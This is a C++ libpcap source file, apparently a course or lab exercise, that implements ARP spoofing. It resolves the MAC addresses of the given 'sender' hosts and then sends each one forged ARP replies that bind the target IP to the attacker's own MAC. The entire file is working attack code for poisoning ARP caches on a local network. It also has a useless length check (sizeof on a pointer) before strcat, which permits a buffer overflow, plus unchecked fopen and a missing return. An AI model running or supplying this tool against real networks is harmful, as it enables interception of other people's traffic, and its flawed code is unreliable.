#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <ifaddrs.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac find_my_MAC(char *interface_name){
    char filename[100] = "/sys/class/net/";
    if(sizeof(interface_name) > 80){
        fprintf(stderr, "interface name is too long\n");
        exit(-1);
    }
    strcat(filename, interface_name);
    strncat(filename, "/address", 9);
    FILE *my_net_file = fopen(filename, "rt");
    char addr[18];
    int ret = fscanf(my_net_file, "%s", addr);
    if(ret == EOF){
        fprintf(stderr, "cannot find address file");
        exit(-1);
    }

    return Mac(addr);
}

char* find_my_IP(char *interface_name){
    struct ifaddrs *myaddrs;
    int ret = getifaddrs(&myaddrs);
    if(ret == EOF){
        fprintf(stderr, "cannot find my ip addr");
        exit(-1);
    }
    struct ifaddrs *tmp = myaddrs;
    while(tmp){
        if(strcmp(tmp->ifa_name, interface_name) == 0 && tmp->ifa_addr->sa_family == AF_INET){
            break;
        }
        tmp = tmp->ifa_next;
    }
    if(!tmp){
        fprintf(stderr, "cannot find interface");
        exit(-1);
    }
    sockaddr_in *myaddr = (sockaddr_in *)(tmp->ifa_addr);
    return inet_ntoa(myaddr->sin_addr);
}

void sendARP_req(pcap_t *handle, Mac smac, char *sip, char *tip){
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void sendARP_reply(pcap_t *handle, Mac dmac, Mac smac, char *sip, char *tip){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(dmac);
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    packet.arp_.tmac_ = Mac(dmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

Mac find_mac(pcap_t *handle, Mac smac, char *sip, char *tip){
    sendARP_req(handle, smac, sip, tip);
    PEthHdr ethernet;
    PArpHdr arp;
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        sendARP_req(handle, smac, sip, tip);
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        ethernet = (PEthHdr)packet;
        if(ethernet->type() != EthHdr::Arp) continue;
        arp = (PArpHdr)(packet + sizeof(*ethernet));
        if(arp->op() != ArpHdr::Reply) continue;
        if(arp->sip() == Ip(tip)){
            return arp->smac();
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    Mac attacker_mac;
    char *attacker_ip;
    Mac *sender_mac_arr;

    attacker_mac = find_my_MAC(dev);
    attacker_ip = find_my_IP(dev);

    sender_mac_arr = (Mac *)malloc(sizeof(Mac) * (argc-2) / 2);
    for(int i=2,j=0;i<argc;i=i+2,j++){
        sender_mac_arr[j] = find_mac(handle, attacker_mac, attacker_ip, argv[i]);
    }
    for(int i=2,j=0;i<argc;i=i+2,j++){
        sendARP_reply(handle, sender_mac_arr[j], attacker_mac, argv[i+1], argv[i]);
    }

    free(sender_mac_arr);
    pcap_close(handle);
}







